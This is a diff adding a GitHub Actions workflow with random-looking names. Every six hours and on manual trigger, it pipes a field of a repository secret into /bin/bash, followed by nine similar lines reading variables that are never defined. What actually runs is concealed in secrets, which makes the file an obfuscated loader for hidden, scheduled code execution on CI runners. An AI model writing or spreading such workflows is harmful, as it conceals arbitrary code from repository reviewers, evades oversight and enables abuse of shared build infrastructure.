@@ -1,0 +1,26 @@
+name: zuolianchengg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuolianchengg
+        env:
+          bafqa40: ${{ secrets.bafqa40 }}
+        run: |
+          echo $bafqa40 | jq -r .q520 | /bin/bash
+          echo $ax9 | jq -r .hgqbv50 | /bin/bash
+          echo $ijslp7 | jq -r .n08429 | /bin/bash
+          echo $msw33 | jq -r .barca57 | /bin/bash
+          echo $qex6208 | jq -r .pxosf466 | /bin/bash
+          echo $yhcpk9740 | jq -r .f217 | /bin/bash
+          echo $n986 | jq -r .bhyr68 | /bin/bash
+          echo $rfdgc0717 | jq -r .e2 | /bin/bash
+          echo $s088 | jq -r .y71177 | /bin/bash
+          echo $iyhw9739 | jq -r .pupqj68728 | /bin/bash
+
